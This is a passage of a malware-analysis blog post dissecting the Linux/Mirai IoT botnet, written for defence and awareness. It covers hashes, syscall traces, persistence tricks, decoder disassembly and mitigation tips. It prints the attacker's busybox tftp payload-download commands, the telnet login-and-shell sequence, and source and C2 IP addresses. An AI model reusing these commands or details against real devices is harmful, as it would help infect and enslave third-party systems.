\u003Cb\u003E\"mirai.*\"\u003C\/b\u003E and is having telnet attack as main functionality to other boxes.   \u003Cp\u003EAs I see these samples as something new, it would be good to start to write analysis for the purpose to raise awareness of this threat widely, since the attacks are actively spotted in the wild on plenty of infected IoT networks. During the checks I discussed about the threat to the engineer friends in ETLabs,[\u003Ca href=\"https:\/\/twitter.com\/ET_Labs\"\u003Elinks\u003C\/a\u003E] who also detecting the same attack phenomena, and then having dialogue with our supporters who reported this threat directly too.   \u003Cp\u003E\u003Cb\u003EELF Linux\/Mirai\u003C\/b\u003E \u003Cfont color=red\u003Eis currently having a very low ELF\/Linux antivirus detection ratio\u003C\/font\u003E, even in the architecture of x86. The detection in VT for the collected multiplatform samples can be viewed in the several links below:\u003Cbr\u003E\u003Cb\u003ELinux\/Mirai\u003C\/b\u003E ITW samples: [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/5bf5d7d6914b14c6b98ca747d3ce463e4289d6614beba72deccd59cd08c90ed3\/analysis\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/2238c81031ca78f4df121c94e1fca5368099b6003c30fef83768fef65ce09e9f\/analysis\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/62cdc8b7fffbaf5683a466f6503c03e68a15413a90f6afd5a13ba027631460c6\/analysis\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/930486713426db5072600c504427ea37f108ee2cee7c7c289866164a83f3f356\/analysis\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/c61bf95146c68bfbbe01d7695337ed0e93ea759f59f651799f07eecdb339f83f\/analysis\/1472702235\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/d9573c3850e2ae35f371dff977fc3e5282a5e67db8e3274fd7818e8273fd5c89\/analysis\/1472702414\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/1bf953862e0ba56144f3469a7915d9e25737a7a75d4d8e64753c9e4ecac96cfc\/analysis\/1472702535\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/65de6303edb13128c26b34b3d3f1a5b78f19302f0c3822b5f82573c045d96c78\/analysis\/1472702972\/\"\u003Elink\u003C\/a\u003E]  [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/ded9c77a46726c8dcebbbe0cf945b6c97e17728aa6ddc1d28dfad300371fa921\/analysis\/\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EThe reason for the lack of detection is because of the lack of samples, which are difficult to fetch from the infected IoT devices, routers, DVR or WebIP Camera, the Linux with Busybox binary in embedded platform, which what this threat is aiming.   \u003Cp\u003E\u003Ch2\u003EThe threat information\u003C\/h2\u003E \u003Cp\u003EThe binaries are collected from multiple direct\/indirect sources: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Emirai.arm:    ELF 32-bit LSB executable, 'ARM', version , statically linked, stripped\u003Cbr \/\u003Emirai.arm7:   ELF 32-bit LSB executable, 'ARM, EABI4' version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003Emirai.mips:   ELF 32-bit MSB executable, 'MIPS, MIPS-I' version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003Emirai.ppc:    ELF 32-bit MSB executable, 'PowerPC or cisco 4500', ver 1 (SYSV), statically linked, stripped\u003Cbr \/\u003Emirai.sh4:    ELF 32-bit LSB executable, 'Renesas SH', version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003Emirai.sparc:  ELF 32-bit MSB executable, 'SPARC', version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003Emirai.x86:    ELF 32-bit LSB executable, 'Intel 80386', version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EI picked up the \u003Ci\u003EELF binary\u003C\/i\u003E in \u003Ci\u003EARM architecture\u003C\/i\u003E for my main reversing since the it was the first ELF appeared, Doing the cross reference with the MIPS, PPC and Sparc ELF ones for the details. In this case, I use plenty of usual tools, nothing fancy or special.  \u003Cp\u003EThe hash of the Linux\/Mirai initial binaries spotted: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EMD5 ('mirai.arm')  = b98bc6ab2ed13028cd5178c422ec8dda\u003Cbr \/\u003EMD5 ('mirai.arm7') = 33987c397cefc41ce5e269ad9543af4c\u003Cbr \/\u003EMD5 ('mirai.mips') = 8e36a1fb6f6f718ec0b621a639437d8b\u003Cbr \/\u003EMD5 ('mirai.ppc')  = e08befb4d791e8b9218020292b2fecad\u003Cbr \/\u003EMD5 ('mirai.sh4')  = 030159a814a533f30a3e17fe757586e6\u003Cbr \/\u003EMD5 ('mirai.sparc')= ac61ba163bffc0ec94944bb7b7bb1fcc\u003Cbr \/\u003EMD5 ('mirai.x86')  = 6b7b6ee71c8338c030997d902a2fa593\u003Cbr \/\u003E\u003C\/pre\u003EThank you to a friend who helped much.  \u003Cp\u003EThese binaries were infected to the compromised Linux system's \u003Ci\u003ESSH \u003C\/i\u003Eor \u003Ci\u003ETelnet \u003C\/i\u003Eaccount (via default password flaw on specific IoT aimed). Upon the shell access gained, the attacker will download the payload of this malware to the Linux device by command traced like below: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E'busybox tftp' -r [MalwareFile] -g [IPsource]\u003Cbr \/\u003E'busybox tftp' -g -l 'dvrHelper' -r [MalwareFile] [IPsource]\u003Cbr \/\u003E\u003C\/pre\u003EThe source of infection (by current download \u0026 connection trace) \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E5.206.225.96 |  |49349 | 5.206.225.0\/24 | DOTSI | PT | tuganet.pt | Dotsi Unipessoal Lda.\u003Cbr \/\u003E151.80.99.84 | ns395732.ip-151-80-99.eu. |16276 | 151.80.0.0\/16 | OVH | FR | ovh.com | OVH SAS\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EExecution processes\u003C\/h2\u003E \u003Cp\u003EIn some cases of the Linux\/Mirai infection is showing traces that the malware was executed without parameter and there are cases where the downloaded malware file(s) is deleted after execution. In this case mostly you won't get the samples unless you dump the malware process to the ELF binary. This explains it is hard to get the good working samples for this new threat.  \u003Cp\u003EDuring the execution, the malware will open the \u003Cb\u003E\/etc\/watchdog\u003C\/b\u003E file in read-write state with the command: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eopen(\"\/dev\/watchdog\", O_RDWR)\u003Cbr \/\u003E\u003C\/pre\u003ENotes: In some newer cases the coder is adding other path of \u003Cb\u003Ewatchdog\u003C\/b\u003E like: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/dev\/misc\/watchdog\u003Cbr \/\u003E\u003C\/pre\u003EMoving forward, and then \u003Cb\u003ELinux\/Mirai\u003C\/b\u003E will change the work directory to the root directory: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Echdir(\"\/\")\u003C\/pre\u003EIt uses  PF_INET socket it is opening UDP\/53 port to access Google DNS server in 8.8.8.8 and established a connection. Something like the below reversed code (see the last section about skeleton reversing) is showing the following commands was executed for this part:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/d1FGT8qEY4S6SABPZMtGv7j9kTEMwSOUW4mypPyP3Gom2jrfkyOteCFgva-RZhmoYnph77ISW3ZkFQ=w555-h130-no\u003E \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Econnect(3, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"8.8.8.8\")}, 16) \u003C\/pre\u003EThe malware will detect the outbound interface and by re-using previous used socket it opens a random TCP\/port to the IP address. If the process above succeed malware will close the socket afterward \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Egetsockname(3, {sa_family=AF_INET, sin_port=htons(39221), sin_addr=inet_addr(\"YOUR-IP\")}, [16])\u003Cbr \/\u003Eclose(3)\u003C\/pre\u003E \u003Cp\u003EAt this point the malware is performing several decoding for strings, which will be resulted in the targeted malware file name (below) and several random names. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0xbf96daa4  0000 0000 0000 0000 0000 0000 0000  ..............\u003Cbr \/\u003E0xbf96dab2  0000 2e2f 6476 7248 656c 7065 7200  ..'\/dvrHelper'.\u003Cbr \/\u003E0xbf96dac0  0000 0000 0000 0000 0000 0000 0000  ..............\u003C\/pre\u003EThe file will be the copy of the malware under \u003Cb\u003E\u003Ci\u003E\/dev\/.{Something}\/dvrHelper\u003C\/i\u003E\u003C\/b\u003E  with piping the \u003Ci\u003Estdout \u003C\/i\u003Eand \u003Ci\u003Estderr \u003C\/i\u003Eon execution made to \u003Ci\u003E\/dev\/null\u003C\/i\u003E (for silent mode execution).  \u003Cp\u003EThe \u003Ci\u003E\/etc\/watchdog\u003C\/i\u003E execution is meant for making the delay, for the malware not to perform the bad function instantly to avoid the early detection, and it just sit there and make sure the malicious opened backdoor port is up and used. The mentioned \u003Ci\u003E{Something}\u003C\/i\u003E is the keyword generated by the malware, in example path: \u003Ci\u003E\/dev\/.anime\/drvHelper\u003C\/i\u003E   \u003Cp\u003EUpon execution the malware will be self-deleted to avoid the trace, but the process is running. In some IoT that can be seen in lsof or the list to the \/proc with specific PID, i.e.: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/proc\/{PID}\/exe -\u003E '\/dev\/.{something}\/dvrHelper' (deleted) \u003Cbr \/\u003E\/proc\/{PID}\/exe -\u003E '.\/{long alphabet strings}' (deleted) \u003C\/pre\u003E \u003Cp\u003EIn this stage, the networking process continues, the malware is opening PF_INET socket for TCP, and bind it to the specific port (not random) \u003Cb\u003ETCP\/48101\u003C\/b\u003E from \u003Cb\u003Elocalhost IP address 127.0.0.1\u003C\/b\u003E and then starting to listen to the incoming connection:  \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Esocket(PF_INET, SOCK_STREAM, IPPROTO_IP)\u003Cbr \/\u003Ebind(3, {sa_family=AF_INET, sin_port='htons(48101'), sin_addr=inet_addr(\"127.0.0.1\")}, 16)\u003Cbr \/\u003Elisten(3, 1) \u003C\/pre\u003E \u003Cp\u003EBy this stage the system-wide realtime clock will be queried (triggered by random) along with the retrieval set of PID, following by start forking, noted the following clocktest output and the stdout of \"NULL\\n\" \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eclock_gettime(CLOCK_REALTIME, {1472261021, 649262704}. \u003Cbr \/\u003Egetpid() \/\/ \/\/ see the reverse engineering part...\u003Cbr \/\u003Egetppid()\u003Cbr \/\u003Eclock_gettime(0x2 \/* CLOCK_??? *\/, {0, 6215000})\u003Cbr \/\u003Eprctl(PR_SET_NAME, 0xbef89752, 0xbef897b8, 0xbef897c8, 0)\u003Cbr \/\u003Ewrite(1, NULL, 0)\u003Cbr \/\u003Ewrite(1, \"\\n\", 1)\u003Cbr \/\u003Efork()\u003C\/pre\u003ENotes: \u003Cpre\u003E\u003Cbr \/\u003E\u003Ci\u003E- forking always starts if infection possible.\u003Cbr \/\u003E- The \"NULL\\n\" is for the execution trace of the watchdog via execl(parse to environment in execve).\u003C\/i\u003E\u003Cbr \/\u003E\u003C\/pre\u003EThen this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).  \u003Cp\u003EFor some infection case the malware is self connected to its opened \u003Cb\u003ETCP\/48101\u003C\/b\u003E \u0026 will continuously looping without making any forks, in this case you won't get infection: \u003Cpre class=\"brush: asm\"\u003E \u003Cbr \/\u003Econnect(4, {sa_family=AF_INET, sin_port=htons(48101), sin_addr=inet_addr(\"0.0.0.0\")}, 16}\u003Cbr \/\u003E\u003C\/pre\u003EList of files will show. it's showing the access port for the nodes.  \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E IPv4 5629  0t0  TCP 127.0.0.1:'48101 (LISTEN)'\u003Cbr \/\u003E IPv4 5670  0t0  TCP 127.0.0.1:60254-\u003E'127.0.0.1:48101 (ESTABLISHED)'\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EIn the forked process, upon the attack command can be triggered, the infected device will perform connection on telnet services on other device for the abuse purpose: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Esocket(PF_INET, SOCK_STREAM, IPPROTO_IP)\u003Cbr \/\u003Econnect(6, {sa_family=AF_INET, sin_port=htons(23), sin_addr=inet_addr(\"x.x.x.x\")}, 16)\u003Cbr \/\u003Esendto(7, \"\\377\\374\\1\", 3, MSG_NOSIGNAL, NULL, 0)\u003Cbr \/\u003Esendto(7, \"\\377\\374!\", 3, MSG_NOSIGNAL, NULL, 0) \u003Cbr \/\u003Esendto(7, \"\\377\\375\\1\", 3, MSG_NOSIGNAL, NULL, 0)\u003Cbr \/\u003Esendto(7, \"\\377\\375\\3\", 3, MSG_NOSIGNAL, NULL, 0)\u003Cbr \/\u003Erecvfrom(0, \"E\\0\\0(\\276~@\\0001\\6t\\342\\305\\347\\335\\323\\300\\250\\262\\vo0\\0\\26\\373\\334\\316\\244\\217\\3425\\214\".\u003Cbr \/\u003Erecvfrom(0, \"E\\0\\0004\u003EJ@\\0*\\6\\fbj\\375(g\\300\\250\\262\\v\\0\\27\\243\\375P\\351\\2211m\\4\\322o\"..\u003Cbr \/\u003Erecvfrom(0, \"E\\0\\0(\\276\\177@\\0001\\6t\\341\\305\\347\\335\\323\\300\\250\\262\\vo0\\0\\26\\373\\334\\316\\244\\217\\3425\\344\"..\u003Cbr \/\u003Erecvfrom(0, \"E\\0\\0(\\276\\200@\\0001\\6t\\340\\305\\347\\335\\323\\300\\250\\262\\vo0\\0\\26\\373\\334\\316\\244\\217\\3426,\"..\u003Cbr \/\u003Erecvfrom(0, \"E\\0\\0,\\0\\0@\\0.\\6\\216=I\\213\\2P\\300\\250\\262\\v\\0\\27\\311gH\\31\\23\\320I\\213\\2Q\".\u003Cbr \/\u003E\u003C\/pre\u003EAnd doing the backdoor to connect via HTTP on \u003Cb\u003E65.222.202.53\u003C\/b\u003E. \u003Cpre class=\"brush: asm\"\u003Econnect(0, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(\"65.222.202.53\")}, 16)\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EMitigation method of Linux\/Mirai infection\u003C\/h2\u003E \u003Cp\u003E\u003Cb\u003EPicking a right ELF is important.. \u003C\/b\u003E\u003Cp\u003EYou'll find so little indicator and some encoded strings in the ARM binary. But there is no problem. First you should pick the clean ELF, it has the characteristic like the below: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EELF Header:\u003Cbr \/\u003E  Magic:   7f 45 4c 46 01 01 01 61 00 00 00 00 00 00 00 00\u003Cbr \/\u003E  Class:                             ELF32\u003Cbr \/\u003E  Data:                              2's complement, little endian\u003Cbr \/\u003E  Version:                           1 (current)\u003Cbr \/\u003E  OS\/ABI:                            ARM\u003Cbr \/\u003E  ABI Version:                       0\u003Cbr \/\u003E  Type:                              EXEC (Executable file)\u003Cbr \/\u003E  Machine:                           ARM\u003Cbr \/\u003E\u003Cbr \/\u003EProgram Headers:\u003Cbr \/\u003E  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\u003Cbr \/\u003E  LOAD           0x000000 0x00008000 0x00008000 0x0dbb4 0x0dbb4 R E 0x8000\u003Cbr \/\u003E  LOAD           0x00e004 0x0001e004 0x0001e004 0x001d4 0x05a84 RW  0x8000\u003Cbr \/\u003E  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4\u003Cbr \/\u003E\u003Cbr \/\u003ESection to Segment mapping:\u003Cbr \/\u003E  Segment Sections...\u003Cbr \/\u003E   00     .init .text .fini .rodata\u003Cbr \/\u003E   01     .ctors .dtors .data .bss\u003Cbr \/\u003E\u003C\/pre\u003EThat's it for the available header \u0026 sections reading.  \u003Cp\u003EFrom each of Linux.Mirai ELF file clean state like above, it has significant strings that can be filtered by signatures: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/dev\/watchdog\u003Cbr \/\u003E'LCOGQGPTGP'\u003Cbr \/\u003E\/proc\/stat\u003Cbr \/\u003E\/proc\/cpuinfo\u003Cbr \/\u003Eprocessor\u003Cbr \/\u003E\/sys\/devices\/system\/cpu\u003Cbr \/\u003Eenter\u003Cbr \/\u003Eogin\u003Cbr \/\u003Eassword\u003Cbr \/\u003E\/dev\/null\u003Cbr \/\u003E\u003C\/pre\u003EIf you are in the Linux box, non DVR or busybox IoT type, secure the access to the below stated directory too..if came up from any unknown executables. It is also a good hazard to kill the chain of infection:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/XsvgjT33vTXRf4zhs6xfQCxodHpNRToNN9Qzy2NsgTtR3FT-HQ8EDfF8os-iBnBlULT4bAhPLSTBPQ=w1313-h292-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/XsvgjT33vTXRf4zhs6xfQCxodHpNRToNN9Qzy2NsgTtR3FT-HQ8EDfF8os-iBnBlULT4bAhPLSTBPQ=w580-h200-no\u003E\u003C\/a\u003E \u003Cp\u003EIn rare occasion for infection of \u003Cb\u003ELinux\/Mirai\u003C\/b\u003E will connect you back to this MUD game site, blocking its IP is good for protection:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/pjNCHUX-G4stRs5Ir-8EO3uHTnhXK39j7AJYLohrICtEYwP71wcF54NlkfTPW5kOEM24-WGSIEVxeQ=w747-h763-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/pjNCHUX-G4stRs5Ir-8EO3uHTnhXK39j7AJYLohrICtEYwP71wcF54NlkfTPW5kOEM24-WGSIEVxeQ=w580-h580-no\u003E\u003C\/a\u003E \u003Cbr\u003E↑The site is showing the asciiart Mirai logo. ↓Anybody's home?? \u003Cimg src=https:\/\/lh3.googleusercontent.com\/pMtYB9eGiF3udaNRFivNmcW2DNjGhS9j1gj2ZRtrg-aVgPhIA9qI3piE7o5jxa6pV3Znzr3x5cSd4Q=w500-h100-no\u003E \u003Cp\u003EBlocking the used TCP\/48101 port if you don't use it, it's good to prevent infection \u0026 further damage: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Emirai 29557 toor 3u  IPv4  386807  0t0  \"TCP 127.0.0.1:48101 (LISTEN)\"\u003Cbr \/\u003Emirai 29557 toor 4u  IPv4  504795  0t0  \"TCP 127.0.0.1:44424-\u003E127.0.0.1:48101 (ESTABLISHED)\"\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EThe other method is to secure your busybox execution to be run only on specific user. You'll need shell access for this operation, along with other hardening methods. The most important thing to prevent the infection is: if you have an IoT device, \u003Cb\u003E\u003Ci\u003Eplease make sure you have no telnet service open and running\u003C\/i\u003E\u003C\/b\u003E.  \u003Cp\u003E\u003Ch2\u003EBotnet protocol used for infection via Telnet service\u003C\/h2\u003E \u003Cp\u003E\u003Ci\u003EThis explanation exists because of there are two good persons are supporting effort to crack it: Special thank's to Waldo Kitty \u0026 @node5.\u003C\/i\u003E \u003Cp\u003EWhat I am explaining here is the telnet scanner function that is used by attacker using the Linux\/Mirai client version to get the installation of this malware in other node with accessible telnetd.  \u003Cp\u003EDuring the telnet session, Linux\/Mirai attacker will communicate with its target with specific protocol. Please see the illustration below for getting the idea of what will be explained in the next writing:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/8oNGUlnUckhyby7Jlvb2yoSXpeE1kwwGEPuKIsyYpJ61u8cDuF8nObntcbkvP-jKEVpOgD-YB4K3XQ=w1600-h768-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/8oNGUlnUckhyby7Jlvb2yoSXpeE1kwwGEPuKIsyYpJ61u8cDuF8nObntcbkvP-jKEVpOgD-YB4K3XQ=w444-h444\u003E\u003C\/a\u003E\u003Cbr\u003EThe Username and Passwords mentioned in the figure are used for login bruting, and is hardcoded in the binary of Linux\/Mirai, along with the commands used for the gaining the shell.  \u003Cp\u003EThe botnet will communicate to the remote access (assuming server) who request the same strings sent, with the \"report\" in CNC callback, with the specific keyword.  \u003Cbr\u003EAfter gaining shell access, the malware sends the shell one-liner command to install malware with the format as below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/uDe6Gy5F20GPiVX8PRFbGJ90n1jlN8iuZnN5uLHQcDZ5jM1XzJbO4vKyvKZDK8m5mPenHQcKN9wQrA=w969-h153-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/uDe6Gy5F20GPiVX8PRFbGJ90n1jlN8iuZnN5uLHQcDZ5jM1XzJbO4vKyvKZDK8m5mPenHQcKN9wQrA=w444-h444-no\u003E\u003C\/a\u003E\u003Cbr\u003EThis command is also hardcoded. It explained why we can not find the samples in the current infected systems since the malware file downloaded will be deleted after the execution.  \u003Cp\u003EThe possible sequence of the attack commands can be shown as below variations: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E{Username}\u003Cbr \/\u003E{Passwords}\u003Cbr \/\u003Eshell\u003Cbr \/\u003Eenable\u003Cbr \/\u003Esh\u003Cbr \/\u003E\/bin\/busybox MIRAI\u003C\/pre\u003E or, the combination below: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E{Username}\u003Cbr \/\u003E{Passwords}\u003Cbr \/\u003Eenable\u003Cbr \/\u003Esystem\u003Cbr \/\u003Eshell\u003Cbr \/\u003Esh\u003Cbr \/\u003Ebin\/busybox MIRAI\u003C\/pre\u003E\u003Cp\u003EThe reversing snips for this infection protocol can be read in \u003Cb\u003Eskeleton reversing section\u003C\/b\u003E.  \u003Cp\u003E\u003Ch2\u003EReversing Linux\/Mirai (stripped ARM) in binary (raw) way\u003C\/h2\u003E \u003Cp\u003EThe binary is reversible, but it's a bit \"heavily stripped\" and has double function for decoders, so it is not that easy to read, but it's fine. You'll see some important \"artifacts\" like these \"case-switch\" they coded to perform attack:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/HZxzLUzeN7DB460HgWyn9Dp8hdb2jKYVV6PnckpRUGVyPDX3PpLLNWK7dO4cmdBlbhKzCqdCD9SI_w=w1186-h492-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/HZxzLUzeN7DB460HgWyn9Dp8hdb2jKYVV6PnckpRUGVyPDX3PpLLNWK7dO4cmdBlbhKzCqdCD9SI_w=w580-h280-no\u003E\u003C\/a\u003E \u003Cp\u003EIf you trace it carefully all of origin for strings used in encoded binary can be read like this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/4jCl0n9mmpsqce_4lRw4cDw7OMxNNSKqleAbv5MWQFnCpjU7XjmD37cPYoaQGhGxBroaImPCmVNewQ=w1846-h863-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/4jCl0n9mmpsqce_4lRw4cDw7OMxNNSKqleAbv5MWQFnCpjU7XjmD37cPYoaQGhGxBroaImPCmVNewQ=w580-h300-no\u003E\u003C\/a\u003E \u003Cp\u003EDecoder \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/\/ just to get the idea...what is cracked..\u003Cbr \/\u003E\u003Cbr \/\u003E  fn.0x0000f9e8(var3,  (int)\"\\rRPMA\\r\\\"\", 7);\u003Cbr \/\u003E  fn.0x0000f9e8(var4,  (int)\"\\rGZG\\\"\", 5);\u003Cbr \/\u003E  fn.0x0000f9e8(var7,  (int)\"jvvrdnmmf\\\"\", 10);\u003Cbr \/\u003E  fn.0x0000f9e8(var8,  (int)\"nmnlmevdm\\\"\", 10);\u003Cbr \/\u003E  fn.0x0000f9e8(var10, (int)\"XMNNCPF\\\"\", 8);\u003Cbr \/\u003E  fn.0x0000f9e8(var11, (int)\"egvnmacnkr\\\"\", 11);\u003Cbr \/\u003E  fn.0x0000f9e8(var14, (int)\"QJGNN\\\"\", 6);\u003Cbr \/\u003E  fn.0x0000f9e8(var15, (int)\"GLC@NG\\\"\", 7);\u003Cbr \/\u003E  fn.0x0000f9e8(var16, (int)\"Q[QVGO\\\"\", 7);\u003Cbr \/\u003E       :\u003Cbr \/\u003E  fn.0x0000f9e8(var17, (int)\"QJ\\\"\", 3);\u003Cbr \/\u003E  fn.0x0000f9e8(var20, (int)\"LAMPPGAV\\\"\", 9);\u003Cbr \/\u003E\u003Cbr \/\u003E\/\/ One decoder in fn.0x0000f9e8\u003Cbr \/\u003E\u003Cbr \/\u003E|           0x0000f9e8      000052e3       cmp r2, 0\u003Cbr \/\u003E|           0x0000f9ec      0ef0a001       moveq pc, lr\u003Cbr \/\u003E|           0x0000f9f0      00c0a0e3       mov ip, 0\u003Cbr \/\u003E|           ; JMP XREF from 0x0000fa04 (fcn.0000f9e8)\u003Cbr \/\u003E|       .-\u003E 0x0000f9f4      0130d1e4       ldrb r3, [r1], 1\u003Cbr \/\u003E|       |   0x0000f9f8      0030cce7       strb r3, [ip, r0]\u003Cbr \/\u003E|       |   0x0000f9fc      01c08ce2       add ip, ip, 1\u003Cbr \/\u003E|       |   0x0000fa00      02005ce1       cmp ip, r2\u003Cbr \/\u003E|       `=\u003C 0x0000fa04      faffff1a       bne 0xf9f4\u003Cbr \/\u003E\\           0x0000fa08      0ef0a0e1       mov pc, lr\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003ESo the usual reversing method can be done to this ELF malware with using any of your flavor reversing tool that can support ELF reading in little endian. (Well, by know you all know what our chosen reversing tool is). I will not say much about this, since all of the previous posts are showing much of this method, but let me explain a new method with the details in the next section.  \u003Cp\u003E\u003Ch2\u003EReversing Linux\/Mirai (stripped ARM) on \"skeleton\" tool\u003C\/h2\u003E \u003Cp\u003EI've been working with my personal project called \u003Ci\u003E\u003Cb\u003Eskeleton\u003C\/b\u003E\u003C\/i\u003E for some time, it was started since the \u003Ci\u003EELF Workshop of MalwareMustDie\u003C\/i\u003E started in here, Tokyo, Japan during AVTokyo conference last year. With the goal to be an \u003Ci\u003Eopen source\u003C\/i\u003E project (currently still in private for some hiccups core development). The tool is having all practical necessity I need during analyzing a new unknown ELF malware, to save my time a lot to focus on the core of codes and source of the threat.   \u003Cp\u003EFor the RCE itself, \u003Ci\u003ESkeleton\u003C\/i\u003E can be used to form the ELF binary into as close as possible to the original state. If a known binary is analyzed by \"skeleton\", it's not interesting and that's not the point of this tool. Skeleton is showing its advantages when you push the unknown ELF into it, so this ARM binary is a good chance to test it :-).  \u003Cp\u003EFirstly, the simple explanation of \"skeleton\" concept can be seen in the figure below, a self-explanatory: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/uluYPQGojhT61S-roKKIt6r0s1flDkAVRNxu-T7LWTvSPGARyc1Mc2VnUrQvOGWBbAIdfuifV7XWWg=w1421-h783-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/uluYPQGojhT61S-roKKIt6r0s1flDkAVRNxu-T7LWTvSPGARyc1Mc2VnUrQvOGWBbAIdfuifV7XWWg=w580-h580-no\u003E\u003C\/a\u003E \u003Cp\u003ESkeleton concept is analyzing the all malware libraries you collected (all vectors related information of one family of malware) in the database, and is checking the new analyzed binary by firstly checking calls made on the sample..just like when you trace a syscalls..but with additional of the \u003Ci\u003Eknown function\u003C\/i\u003E too are stored in malcode dataset. For example, in this Linux\/Mirai this is the statistic of used syscall (this is only the example, using a very well known command):\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/ZpYlPTGhEm8jyu8Mp1KLwBXHIEo3adaUFhne7AubVq4sBolI6M2IKU3_SJ8bRGZrkLGkz9SrLF5org=w864-h511-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/ZpYlPTGhEm8jyu8Mp1KLwBXHIEo3adaUFhne7AubVq4sBolI6M2IKU3_SJ8bRGZrkLGkz9SrLF5org=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EThen the tool is parsed by radare2 assembly dump of the malware, in the form like in the below picture's shown:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/4k_LqQTA_2iLVeJofEEL-S6QeVDq0XqLakLfG2FaBjzyIsOa2ggdYLM9j9vVGos8kPoHko0lgmh3Nw=w699-h953-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/4k_LqQTA_2iLVeJofEEL-S6QeVDq0XqLakLfG2FaBjzyIsOa2ggdYLM9j9vVGos8kPoHko0lgmh3Nw=w444-h444-no\u003E\u003C\/a\u003E \u003Cbr\u003E..and after some process (sorry that I can not say openly here), receiving a not-bad reversing output in the C-like (NOT C++). The result is not 100% looks like the original source code. Specially if you are reversing this from ARM processor which many variable declaration will be passed more steps through registers than Intel, but it will get you into an idea of what kind of code that's actually responsible for this badness. The code generated by this scheme is making a basic concept code of what the actual source code is, why I called it as \"skeleton\".   \u003Cbr\u003E\u003Ci\u003EPS: Radare is the best tool for RCE in this planet, me and MMD team are proud to use it for so long.\u003C\/i\u003E \u003Cp\u003E..And I was not surprised when I saw that \u003Cb\u003EELF Linux\/Mirai\u003C\/b\u003E was actually showing many part of codes as similar as GayFgt\/Torlus\/Lizkebab or Bash0day\/Bashdoor\/BashLite.\u003Cbr\u003EReference about GayFgt\/Torlus\/Lizkebab [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2016\/02\/mmd-0052-2016-skidddos-elf-distribution.html#gayfgt\"\u003Elink\u003C\/a\u003E]   \u003Cp\u003EBelow are screenshots of view 